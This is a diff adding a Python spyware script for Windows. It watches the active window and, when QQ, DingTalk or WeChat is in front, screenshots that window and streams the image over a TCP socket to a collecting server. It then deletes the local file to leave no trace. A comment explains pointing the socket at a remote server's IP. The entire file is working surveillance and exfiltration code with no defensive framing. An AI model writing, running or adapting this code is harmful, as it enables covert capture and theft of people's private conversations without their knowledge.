@@ -1,0 +1,111 @@
+import win32gui as w
+import win32process,logging
+import wmi,uuid,os,filecmp
+import time
+from PIL import ImageGrab
+import ctypes
+import socket
+import sys
+import struct
+
+from ctypes.wintypes import *
+#import mypyutils
+
+g_allNeedCaptureSoft = ';QQ.EXE;DINGTALK.EXE;WECHAT.EXE;'
+
+c = wmi.WMI()
+def get_window_rect(hwnd):#获取窗口大小
+    try:
+        f = ctypes.windll.dwmapi.DwmGetWindowAttribute
+    except WindowsError:
+        f = None
+    if f:
+        rect = ctypes.wintypes.RECT()
+        DWMWA_EXTENDED_FRAME_BOUNDS = 9
+        f(ctypes.wintypes.HWND(hwnd),
+          ctypes.wintypes.DWORD(DWMWA_EXTENDED_FRAME_BOUNDS),
+          ctypes.byref(rect),
+          ctypes.sizeof(rect)
+          )
+        return rect.left, rect.top, rect.right, rect.bottom
+def get_app_path(hwnd):
+    try:
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        for p in c.query('SELECT ExecutablePath FROM Win32_Process WHERE ProcessId = %s' % str(pid)):
+            exe = p.ExecutablePath
+            break
+    except:
+        return None
+    else:
+        return exe
+
+
+def get_app_name(hwnd):
+    exe = None;
+    try:
+        _, pid = win32process.GetWindowThreadProcessId(hwnd)
+        for p in c.query('SELECT Name FROM Win32_Process WHERE ProcessId = %s' % str(pid)):
+            exe = p.Name
+            break
+    except:
+        return None
+    else:
+        return exe
+
+
+if __name__ == "__main__":
+    #mypyutils.initLog('capturewindows.log')
+    lastJpgName = None;
+    lastTitle = None;
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        # s.connect(('服务器的ip', 6666))  #服务器和客户端在不同的系统或不同的主机下时使用的ip和端口，首先要查看服务器所在的系统网卡的ip
+        s.connect(('127.0.0.1', 6666))  # 服务器和客户端都在一个系统下时使用的ip和端口
+        try:
+            activeWnd = w.GetForegroundWindow();
+            appName = get_app_name(activeWnd)
+            if  appName is None:
+                print('无法获取活动窗口进程名...');
+                time.sleep(0.1);
+                continue;
+            else:
+                print('窗口进程名为%s'%appName);
+
+            appName = str.upper(appName)
+            if g_allNeedCaptureSoft.__contains__(appName) is False:#若窗口应用不为通信软件则继续
+                time.sleep(1);
+                continue;
+
+            title = w.GetWindowText (activeWnd)
+            wndRect = get_window_rect(activeWnd);#获取当前窗口大小
+            title ='----window title = %s,rect=%d,%d,%d,%d -----'%(title,wndRect[0],wndRect[1],wndRect[2],wndRect[3]);
+            print("title:",title)
+            if lastTitle is not None and str(title).__eq__(lastTitle) is False:#这是判断啥的？
+                print(title)
+            lastTitle = title
+            fileName = appName + '-'+ time.strftime("%H-%M-%S", time.localtime()) + str(uuid.uuid4().__str__())[5:10] +'.png'
+            img=ImageGrab.grab(wndRect)
+            img.save(fileName, "PNG")
+            print("保存成功")
+            fhead = struct.pack(b'128sq', bytes(os.path.basename(fileName), encoding='utf-8'),
+                                os.stat(fileName).st_size)  # 将图像以128sq的格式打包
+            s.send(fhead)
+
+            fp = open(fileName, 'rb')  # 打开要传输的图片
+            while True:
+                data = fp.read(1024)  # 读入图片数据
+                if not data:
+                    print('{0} send over...'.format(fileName))
+                    break
+                s.send(data)  # 以二进制格式发送图片数据
+            s.close()
+            fp.close()
+            os.remove(fileName)#上传成功后删除文件
+            if lastJpgName is None:
+                lastJpgName = fileName
+                continue
+        except Exception as e:
+            lastJpgName = None;
+            logging.error('循环处理过程发生异常了，但仍然继续处理.....');
+            logging.exception(e);
+        time.sleep(1)
